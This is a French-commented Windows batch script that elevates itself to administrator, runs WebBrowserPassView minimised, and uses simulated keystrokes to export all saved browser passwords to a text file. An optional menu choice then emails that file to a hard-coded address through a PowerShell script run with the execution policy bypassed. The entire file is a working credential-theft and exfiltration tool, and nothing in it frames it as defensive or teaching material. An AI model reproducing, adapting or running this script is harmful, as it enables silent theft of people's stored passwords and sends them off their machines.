@echo off

rem Elevation en administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

set "WBPV=%~dp0WebBrowserPassView.exe"
set "OUTPUT=%~dp0passwords_export.txt"
set "EMAIL=REMOVED_SMTP_EMAIL"

rem Configuration email - A MODIFIER
set "SMTP_USER=VOTRE_EMAIL@gmail.com"
set "SMTP_PASS=VOTRE_MOT_DE_PASSE_APPLICATION"

:MENU
cls
echo ========================================
echo    WebBrowserPassView - Export Tool
echo ========================================
echo.
echo 1. Enregistrement local uniquement
echo 2. Enregistrement et envoi par email
echo.
echo 0. Quitter
echo.
set /p choice="Choisissez une option (1, 2 ou 0): "

if "%choice%"=="1" goto EXPORT
if "%choice%"=="2" goto EXPORT_AND_SEND
if "%choice%"=="0" exit /b
goto MENU

:EXPORT
if not exist "%WBPV%" (
  echo WebBrowserPassView.exe non trouve.
  pause
  goto MENU
)

echo.
echo Lancement de WebBrowserPassView (en arriere-plan)...

rem Lancer le logiciel minimise
start /min "" "%WBPV%"

echo Attente du chargement...
timeout /t 4 /nobreak >nul

echo Selection des donnees...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')"

timeout /t 1 /nobreak >nul

echo Initialisation de l export...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')"

timeout /t 2 /nobreak >nul

echo Envoi du chemin de sauvegarde...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')"

timeout /t 3 /nobreak >nul

echo Fermeture du logiciel...
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

timeout /t 1 /nobreak >nul

if exist "%OUTPUT%" (
  echo.
  echo Termine. Fichier sauvegarde: %OUTPUT%
) else (
  echo.
  echo ERREUR: Le fichier n a pas ete cree.
  echo Verifiez que WebBrowserPassView a bien trouve des mots de passe.
)

echo.
pause
exit /b

:EXPORT_AND_SEND
if not exist "%WBPV%" (
  echo WebBrowserPassView.exe non trouve.
  pause
  goto MENU
)

echo.
echo Lancement de WebBrowserPassView (en arriere-plan)...

rem Lancer le logiciel minimise
start /min "" "%WBPV%"

echo Attente du chargement...
timeout /t 4 /nobreak >nul

echo Selection des donnees...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')"

timeout /t 1 /nobreak >nul

echo Initialisation de l export...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')"

timeout /t 2 /nobreak >nul

echo Envoi du chemin de sauvegarde...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')"

timeout /t 3 /nobreak >nul

echo Fermeture du logiciel...
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

timeout /t 1 /nobreak >nul

if not exist "%OUTPUT%" (
  echo.
  echo ERREUR: Le fichier n a pas ete cree.
  echo Verifiez que WebBrowserPassView a bien trouve des mots de passe.
  pause
  goto MENU
)

echo.
echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...
powershell -ExecutionPolicy Bypass -File "%~dp0send_email.ps1" "%OUTPUT%" "%EMAIL%" "%SMTP_USER%" "%SMTP_PASS%"

echo.
pause
exit /b